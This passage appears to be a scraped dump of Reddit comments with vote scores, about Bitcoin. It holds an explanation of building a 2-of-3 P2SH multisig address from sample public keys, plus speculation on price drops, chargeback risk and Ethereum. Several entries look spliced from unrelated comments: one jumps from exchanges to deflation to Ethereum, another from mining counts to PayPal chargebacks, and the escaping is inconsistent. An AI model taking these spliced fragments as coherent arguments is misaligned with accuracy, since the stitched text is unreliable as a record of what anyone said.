You need the public keys of each participant, and with only your private key you can only know your public key.': 3, '[deleted]': 1, 'Correct, and all these public keys are required to generate the address, which is a hash of all the public keys concatenated with the integers n and m. The non-hashed version of this (the redeem script) is required to redeem the funds. A dummy transaction is created with this redeem script as the only input, this is what is signed and the resulting signature is appended to the redeem script on the actual transaction that will be broadcast.\n\nSimple right?': 1, 'No, the multisig address is just a hash of all of the public keys that comprise it.  For example, a simple 2-of-3 multisig address would be:\n\n    OP_2 + length of 1st pubkey + 1st pubkey + length of 2nd pubkey + 2nd pubkey + length of 3rd pubkey + 3rd pubkey + OP_3 + OP_CHECKMULTISIG\n\nOP_2 is the number of key sigs needed to unlock, and OP_3 is the total number of keys.\n\nBitcoin at it\'s core, when it "verifies" transactions is really just running a simple script and seeing if the script validates to "True".  So with normal addresses, the script is akin to "check that this script signature is valid for the transaction, and that it is the signature for the correct public key, and that that public key is the correct public key that corresponds to the right bitcoin address" and if all that is true, then the transaction validates.\n\nBut there\'s another type of pseudo-address called P2SH, which stands for "pay to script hash", which instead of validating the address, validates ANY arbitrary script, and as long as the requisite keys within that script sign the transaction and meet the requirements for whatever the script is, it will validate.  And it\'s called P2SH because instead of the "address" being the hash of a bitcoin public key, the address is just the hash of that arbitrary script.\n\nSo let\'s make a multisig.  If we use the three random compressed keys:\n\n    0387997583CFF12A1D881AD0FA44F6FE4AD138B9139258CEC089537DD34CA2D7DC\n\n    022E6FC8AFE34EC0A0529CC6719375A9578BCD319675E1C46EE70E4A666C608790\n\n    02F757B278B520A3EFA8DA4E06BDA42CDA2B4D29D6BB2B6AD2D3BD568DFBD4BC03\n\nas well as the [info from the bitcoin wiki](https://en.bitcoin.it/wiki/Script) on which bytes represent the OP codes, and we use the format I talked about at the beginning, we can construct the following script:\n\n    52 (OP_2) + 21 (the hex of 33, which is the number of bytes long the public key is) + \n\n    0387997583CFF12A1D881AD0FA44F6FE4AD138B9139258CEC089537DD34CA2D7DC\n\n    + 21 (again, the next key is 33 bytes long) +\n\n    022E6FC8AFE34EC0A0529CC6719375A9578BCD319675E1C46EE70E4A666C608790\n\n    + 21 +\n\n    02F757B278B520A3EFA8DA4E06BDA42CDA2B4D29D6BB2B6AD2D3BD568DFBD4BC03\n\n    + 53 (OP_3) + AE (OP_CHECKMULTISIG)\n\nand we get a final redeem script of:\n\n    52210387997583CFF12A1D881AD0FA44F6FE4AD138B9139258CEC089537DD34CA2D7DC21022E6FC8AFE34EC0A0529CC6719375A9578BCD319675E1C46EE70E4A666C6087902102F757B278B520A3EFA8DA4E06BDA42CDA2B4D29D6BB2B6AD2D3BD568DFBD4BC0353AE\n\nthen we take the sha256 of that, and then the ripemd160 hash of that sha256 hash, to get a final hash of:\n\n    90923433AA41248DB093652A0F9F570AE6C888D5\n\nthen we put an 05 version byte in front of it, since that\'s the convention for multisigs, and we base58 check-encode it, which results in the base58 string of:\n\n    3EsSNbNC353LsxWaoyViSUHHfw4QmnK4f6\n\nwhich is the address for the 2-of-3 multisig create using those three public keys.\n\nSo as you can see, the only way for a person to determine the multisig public address is to know all of the public keys that were used to create it, since the address is nothing more than a hash of all those keys.': 2, 'Dang, so much information but not so complicated.

People can go wherever they want to conduct their business.': 2, "Personally, I suspect it has more to do with a combination of merchant adoption and speculators. Merchant adoption is putting pressure on prices, because merchants immediately convert their bitcoin revenues to dollars/euro's. However, merchant adoption alone doesn't explain the extreme downturn. If we take the speculators out of the equation, merchant adoption would have probably been only a slight downwards effect on prices. Prices would have declined, but at a very slow pace in my estimate. \n\nBut some speculators have predicted this slight downturn (probably from looking how the market reacted to Overstock, Dish and Dell) and sold, exarcebating the effect. One particular exchange (I think Bitfinex?) also had some extreme price action, where a selloff (I hear this was triggered by price action on Bitstamp, but not sure if true) triggered a series of margin calls. The cascading effect of these margin calls dragged all the exchanges down considerably. Prices were slow to recover since then, because I think it shocked the market. They were also not sure if margin calls should be seen as legitimate or illegitimate price action, so they didn't know if buying bitcoin to recover prices were justified at that moment. \n\nThe result of all the above is damaged confidence. For awhile prices remained stable, but stability is only temporary until sentiment determines where the market goes next. And the sentiment was negative due to all the recent price action as well as that merchant adoption was still occurring. This  triggered a bear market based on TA (technical analysis), resulting in speculators massively selling off.\n\nAnyways, this is the thinking of a mere amateur. If any Wallstreet expert can bring light to this, it would be much appreciated.": 1, "No, I don't believe that is the reason. Without exchanges there would have been no way for the prices to reach their $1000+ highs since btc to btc transactions do not say anything about USD price. The fees create btc economic activity so that might be a positive actually, but if the owners take their share in USD and buy a Rolex in USD that probably helps fiat currencies such ad USD more than helping btc.

Distribution is only a problem with inflationary currencies, not deflationary ones. The reason is that one cannot derive usury from them. Note that usury is not the same as arbitrage. The problem is that you can't win the arbitrage game over the long term since you're selling for a currency that's eventually worth less (or worthless.) Furthermore from a wealth disparity perspective deflationary currencies promote distribution because they exploit human greed... see the million dollar pizza.

The other uses such as cloud storage will also drive mainstream adoption faster than bitcoin.. So they are tokens that mimic bitcoins currency aspect, but will be held by many more people, therefore will naturally be used as money over time.. and to top it all off Ethereum\'s Ether is far better at being money than even bitcoin is!! \n\nI predict Bitcoin will remain prevelant but as these other platforms gain traction they will over take bitcoin in usage and because more people will end up owning ether than bitcoin it will naturally become the default currency. It might not be ether, but I predict the token that gains the most usage (the platform with the most mainstream usefulness) will also win as currency.. Its happened before with mobile money, Mpesa was not the first to market but won because of the amount of shops in Kenya that offered a point of sale for the currency, same thing with crypto, the most used and easiest accessed will win, and a token that everyone wants so they can access Ethereum or Storj will beat bitcoin simply because there will be more people using it! \n\nBitcoin itself has a lot of regulatory head winds ahead too, mainstream public just dont get the point of bitcoin, but they get the point of cloud storage and decentralised apps.. and if that wasnt enough bitcoin has a huge target painted on its back, it will be easy for regulators to stifle its growth, or governments to find an excuse to ban it, but tell me who is going to say that a platform for decentralised cloud storage or decentralised apps is a way for terrorists to launder money? That label will stay with bitcoin forever now, and if someone says storj will be used to launder money you can simply say thats bitcoin and dark wallets department! \n\nIts not a bad thing if Ethereum ends up with more traction than bitcoin, Its a good thing, fairer monetary distribution, a better form of money than bitcoin, a platform that is cheaper and easier to innovate on than bitcoin.. and the kicker, I would rather live in a future where the main global financial and economic operating platform is called Ethereum not Bitcoin.. :)': 1, 'Please explain to me how buying 5000 bitcoins for $29 in 2009 is supposed to be a significant risk? \n\nAt this point it seems obvious that the initial distribution of bitcoin was extremely skewed.': 1, 'I think it has nothing to do with how many bitcoins have been mined.

If you've ever been involved in a PayPal or other credit card chargeback dispute, you know what I'm talking about.  Beyond the financial risks associated with chargebacks for the payment processor, there is a substantial risk of losing the merchant account being used to process these payments.  If your account gets more than 0.5-1.0% chargebacks by total processed or count of transactions, you are very likely to lose your merchant account and have a difficult time getting a new one.\n\nAs you may be aware, there are piles of stolen credit card numbers out there and doing instant conversions opens you to organized criminal outfits trying to put this data to use.": 3, "I think such a service would violate the KYC/AML rules, so it probably wouldn't survive too long.": 1, 'or suffer buyer fraud and lose all your front money. :J': 1, 'circle?': 1, "There really isn't for a simple reason.
